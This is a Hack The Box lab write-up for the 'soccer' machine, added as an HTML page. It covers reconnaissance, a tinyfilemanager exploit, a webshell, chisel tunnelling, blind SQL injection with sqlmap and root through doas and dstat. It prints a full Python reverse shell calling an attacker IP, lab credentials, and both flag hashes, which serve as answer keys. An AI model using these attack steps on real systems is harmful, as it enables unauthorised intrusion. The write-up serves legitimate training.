@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>HTB soccer - HTB Writeups</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">HTB soccer</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1677813159409"
+                  >2023-03-02 22:12</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1678122523289"
+                  >2023-03-06 12:08</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We start with nmap:<br />
+nmap -sV -sC -oA nmap/intial 10.10.11.194</p>
+<p><img src="/_resources/f5c0a3f5c4a34a45b25fbb00934974a1.png" /></p>
+<p>The nmap scan tells us the name of the page is soccer.htb so we change the /etc/hosts file</p>
+<p>We run a full scan while we go explore the page, but find no additional ports.</p>
+<p>We do a banner grab on port 9091 with a GET request:<br />
+<img src="/_resources/7e02089f74d34e979d84dd7dff7ef642.png" /></p>
+<p>The server on port 80 is running nginx 1.18.0<br />
+<img src="/_resources/c1b6c4c899e245e3a18fea7d63272cd5.png" /></p>
+<p>The page loads:<br />
+<img src="/_resources/c895ffc9363343068c4172ad713777bd.png" />!</p>
+<p>We find a /tiny subdirectory using feroxbuster:<br />
+<img src="/_resources/44cebe31e0914bcbaf7ea604ce046b01.png" /></p>
+<p>There we have a login portal:<br />
+<img src="/_resources/b0176b5c96b44472ab3a54d4eb73648f.png" /></p>
+<p>We can see this is tinyfilemanager version 2.4.3<br />
+<img src="/_resources/1d4c5e2c27064c47b91c3298f9bd8896.png" /></p>
+<p>A quick search tells us we can expoit this service:<br />
+<a title="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit" href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit</a></p>
+<p>Using the admin creds in the example exploit admin:admin@123 we are able to autheniticate, which means this is a vulnerable version.<br />
+<img src="/_resources/8458caeafe85467697734079697b73ba.png" /><br />
+<img src="/_resources/1d2543be7cd0464eae04843062aeaaed.png" /></p>
+<p>We can upload our own webshell manually:<br />
+<img src="/_resources/13acead1696f4069a464d807f874522b.png" /></p>
+<p>We navigate to the uploads folder on the site and find our shell.<br />
+<a title="http://soccer.htb/tiny/uploads/foil.php?cmd=id" href="http://soccer.htb/tiny/uploads/foil.php?cmd=id">http://soccer.htb/tiny/uploads/foil.php?cmd=id</a><br />
+<img src="/_resources/2e8e3dc5eba24e588078138ba90901ac.png" /></p>
+<p>Our webshell disappears rather quickly so we need to try using a php reverse shell file rather than a webshell.</p>
+<p>We get a reverse shell:<br />
+<img src="/_resources/ad8206a47c724153b42b034783964d70.png" /><br />
+We see that there is a user, player:<br />
+<img src="/_resources/07e5df22a044466097cf652d465fc6dd.png" /><br />
+uname -a tells us:<br />
+Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>We read the tinyfilemanager.php file and see only two users:<br />
+<img src="/_resources/71a50e8af8114ad6827d0ce58e33dcd2.png" /></p>
+<p>We see a subdomain in /etc/nginx/sites-enabled:<br />
+<img src="/_resources/ddc34c07d76a4ce7a4adf3d8c84e47de.png" /><br />
+We read that the site is running on port 3000<br />
+<img src="/_resources/36fd0e7b1a1c4e18bad29073d1a5f48c.png" /></p>
+<p>The site is only running on the localhost, so we can try using chisel to run it on our machine:<br />
+We start chisel on our machine:<br />
+./chisel64 server -p 8001 --reverse<br />
+On the target we use:<br />
+./chisel64 client 10.10.14.10:8001 R:socks</p>
+<p>The site loads once we use our socks5 proxy through FoxyProxy:<br />
+<img src="/_resources/635dfb7790ba4439b43d26fe0e2a1d73.png" /></p>
+<p>We create an account:<br />
+<img src="/_resources/581503543a874eb1b2847578feedba33.png" /></p>
+<p>We look at the source code and see that the site is running a websocket:<br />
+<img src="/_resources/87bdf3138b7e4b25b84860c6d6910565.png" /></p>
+<p>We can use the script here to direct requests back to our machine:<br />
+<a title="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html</a><br />
+We modify the script to change the socket to the socket we found in the source code:<br />
+<img src="/_resources/b18073985a624dfd8522403c01df9af8.png" /></p>
+<p>We run the script and then run sqlmap:<br />
+sqlmap -u "<a title="http://localhost:8081/?id=1" href="http://localhost:8081/?id=1">http://localhost:8081/?id=1</a>" -p "id"</p>
+<p>The id paramater is injectable, so we dump the database:<br />
+<img src="/_resources/6d0c6eea7d424669965bd471a8fe66a9.png" /></p>
+<p>We get credentials:<br />
+<img src="/_resources/3f844a5231f94a699401450041e980c8.png" /></p>
+<p>We can try to use these on ssh:<br />
+player:PlayerOftheMatch2022</p>
+<p>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" player@soccer.htb</p>
+<p>They work and we get the user.txt:<br />
+<img src="/_resources/178908e3c7784aedad3cbeac7a71664e.png" /><br />
+5a1c2b1cfc34b0860c365e9780ad7624</p>
+<p>We run the command to check for suid binaries and find an unusual binary:<br />
+find / -perm -u=s -type f 2&gt;/dev/null<br />
+<img src="/_resources/b751c839c7b24ca98f56deaca3954080.png" /></p>
+<p>We read the configuration file for doas and find an interesting entry.<br />
+cat /usr/local/etc/doas.conf<br />
+<img src="/_resources/b559ae47f6c4423bbc75d267218e06c5.png" /></p>
+<p>According to this reference, if we are allowed to run as sudo, we can execute a python file as root.<br />
+<a title="https://gtfobins.github.io/gtfobins/dstat/" href="https://gtfobins.github.io/gtfobins/dstat/">https://gtfobins.github.io/gtfobins/dstat/</a></p>
+<p>We can create a reverse shell python script and execute is using the following command:</p>
+<p>doas -u root /usr/bin/dstat --filename</p>
+<p>we make a reverse shell called dstat_banana.py in the /usr/local/share/dstat folder</p>
+<p>import socket,subprocess,os;<br />
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br />
+s.connect(("10.10.14.10”,1337));</p>
+<p>os.dup2(s.fileno(),0);<br />
+os.dup2(s.fileno(),1);<br />
+os.dup2(s.fileno(),2);</p>
+<p>import pty; pty.spawn(“/bin/bash”)</p>
+<p><img src="/_resources/7121f55167ac4a3eb432e21ec485e86c.png" /></p>
+<p>Then we run:<br />
+doas -u root /usr/bin/dstat --banana</p>
+<p><img src="/_resources/db11a269c5654b32a3078c2a899a67af.png" /></p>
+<p>We get our root shell and grab the root.txt:</p>
+<p><img src="/_resources/147786b8413842cc8df999951305e14f.png" /></p>
+<p>9da0fd47bd42fcdbed86727e7586973e</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
